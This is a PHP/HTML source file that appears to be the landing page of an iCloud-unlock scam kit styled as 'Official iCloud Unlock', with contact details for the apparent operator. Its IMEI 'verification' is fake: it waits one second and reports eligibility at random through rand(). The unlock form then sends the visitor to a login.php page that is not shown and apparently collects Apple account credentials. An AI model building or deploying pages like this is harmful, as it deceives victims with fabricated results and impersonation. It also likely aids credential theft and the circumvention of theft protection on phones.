<?php
session_start();

// Inclure la configuration de la base de données (si nécessaire pour des fonctionnalités futures)
require_once 'db_config.php';

// Traitement de la vérification IMEI (simulé côté serveur)
$verificationStatus = '';
$verificationStatusClass = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['verify_imei'])) {
    $imeiToVerify = trim($_POST['verify_imei']);
    if (strlen($imeiToVerify) >= 14) {
        $verificationStatusClass = 'verifying';
        $verificationStatus = 'Verifying IMEI...';
        sleep(1);

        $isEligible = (rand(0, 9) < 8);
        if ($isEligible) {
            $verificationStatusClass = 'eligible';
            $verificationStatus = 'IMEI is likely eligible for unlocking!';
        } else {
            $verificationStatusClass = 'not-eligible';
            $verificationStatus = 'IMEI may not be eligible for unlocking. Please proceed with caution.';
        }
    } else {
        $verificationStatusClass = 'error';
        $verificationStatus = 'Please enter a valid IMEI number (at least 14 characters).';
    }
}

// Traitement de la soumission du formulaire de déverrouillage
$imeiErrorUnlock = '';
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['imei_unlock'])) {
    $imeiUnlock = trim($_POST['imei_unlock']);
    if (strlen($imeiUnlock) >= 14) {
        $_SESSION['imei_to_unlock'] = $imeiUnlock;
        header("Location: login.php");
        exit();
    } else {
        $imeiErrorUnlock = 'Please enter a valid IMEI number (at least 14 characters).';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Official iCloud Unlock - Instant Verification</title>
    <link rel="stylesheet" href="index2.css">
    <style>
        .status-message {
            margin-top: 10px;
            padding: 10px;
            border-radius: 4px;
        }
        .verifying {
            background-color: #f0f8ff;
            color: #6495ed;
            border: 1px solid #6495ed;
        }
        .eligible {
            background-color: #e6ffe6;
            color: #2e8b57;
            border: 1px solid #2e8b57;
        }
        .not-eligible {
            background-color: #ffe6e6;
            color: #b22222;
            border: 1px solid #b22222;
        }
        .error {
            background-color: #ffe0b2;
            color: #d2691e;
            border: 1px solid #d2691e;
        }
        .error-input {
            border: 1px solid red;
        }
    </style>
</head>
<body>
    <header class="app-header">
        <a href="index.php" class="logo-link">
            <img src="/imgs/IMG4843.PNG" alt="Official iCloud Unlock" class="logo" width="120">
        </a>
        <h1 class="app-title"><strong>Official iCloud Unlock</strong></h1>
    </header>

    <main class="app-main">
        <section class="instant-verification">
            <h2 class="section-title">Experience Instant IMEI Verification</h2>
            <p class="section-description">Tired of waiting? Enter your IMEI and get instant feedback on the unlock eligibility of your device before proceeding.</p>
            <div class="verification-form">
                <form method="post">
                    <label for="verify-imei" class="form-label">Enter IMEI Number:</label>
                    <input type="text" id="verify-imei" class="form-input" name="verify_imei" placeholder="Enter your IMEI number">
                    <button type="submit" class="button primary-button" id="verify-button">Verify IMEI</button>
                    <?php if (!empty($verificationStatus)): ?>
                        <div id="verification-status" class="status-message <?php echo $verificationStatusClass; ?>"><?php echo $verificationStatus; ?></div>
                    <?php endif; ?>
                </form>
            </div>
        </section>

        <section class="unlock-form">
            <h2 class="section-title">Unlock Your Device</h2>
            <form method="post" class="unlock-form-fields" id="unlockForm">
                <div class="form-group">
                    <label for="imei">IMEI Number:</label>
                    <input type="text" id="imei" name="imei_unlock" class="form-input <?php if (!empty($imeiErrorUnlock)) echo 'error-input'; ?>" placeholder="Enter your IMEI number">
                    <?php if (!empty($imeiErrorUnlock)): ?>
                        <p id="imei-error" class="error-message"><?php echo $imeiErrorUnlock; ?></p>
                    <?php else: ?>
                        <p id="imei-error" class="error-message"></p>
                    <?php endif; ?>
                </div>
                <button type="submit" class="button primary-button" id="unlock-button">
                    Unlock Now
                </button>
                <p class="warning-message"><span aria-hidden="true">⚠️</span>: Ensure your phone is connected to internet via Wi-Fi <span aria-hidden="true">🛜</span> or cellular data <span aria-hidden="true">📶</span> during the unlocking process.</p>
            </form>
        </section>

        <section class="why-choose-us">
            <h2 class="section-title">Why Choose Official iCloud Unlock?</h2>
            <ul class="features-list">
                <li class="feature-item"><span aria-hidden="true">➡️</span> Fast and Secure Service</li>
                <li class="feature-item"><span aria-hidden="true">➡️</span> Satisfaction Guarantee</li>
                <li class="feature-item"><span aria-hidden="true">➡️</span> 24/7 Customer Support</li>
                <li class="feature-item"><span aria-hidden="true">➡️</span> Affordable Prices</li>
            </ul>
        </section>

        <section class="contact-us">
            <h2 class="section-title">Contact Us</h2>
            <p class="section-description">For more information or assistance, please reach out to us via:</p>
            <ul class="contact-list">
                <li class="contact-item"><a href="https://wa.me/16265874699" target="_blank" rel="noopener noreferrer">WhatsApp: +1(626)587-4699</a></li>
                <li class="contact-item"><a href="mailto:cameronwalter77@gmail.com">📩: cameronwalter77@gmail.com</a></li>
                <li class="contact-item"><a href="https://t.me/official24bypassiphone" target="_blank" rel="noopener noreferrer">Telegram: https://t.me/official24bypassiphone</a></li>
            </ul>
        </section>
    </main>

    <footer class="app-footer">
        <p>&copy; 2024 Official iCloud Unlock</p>
        <a href="mentions-legales.html" class="legal-link">Legal Notice</a>
    </footer>

    <script>
        // Suppression de la logique JavaScript de vérification IMEI

        // Suppression de la logique de stockage de l'IMEI dans localStorage

        // Modification de la soumission du formulaire de déverrouillage
        document.addEventListener('DOMContentLoaded', () => {
            const unlockForm = document.getElementById('unlockForm');
            const imeiInputUnlock = document.getElementById('imei');
            const imeiError = document.getElementById('imei-error');
            const unlockButton = document.getElementById('unlock-button');

            if (unlockForm && imeiInputUnlock && imeiError && unlockButton) {
                unlockButton.addEventListener('click', (event) => {
                    const imeiValue = imeiInputUnlock.value.trim();
                    if (imeiValue.length < 14) {
                        event.preventDefault(); // Empêcher la soumission si l'IMEI est invalide
                        imeiError.textContent = 'Veuillez entrer un numéro IMEI valide (au moins 14 caractères).';
                        imeiInputUnlock.classList.add('error-input');
                    } else {
                        imeiError.textContent = '';
                        imeiInputUnlock.classList.remove('error-input');
                        // La soumission du formulaire redirigera vers login.php
                    }
                });
            }
        });
    </script>
</body>
</html>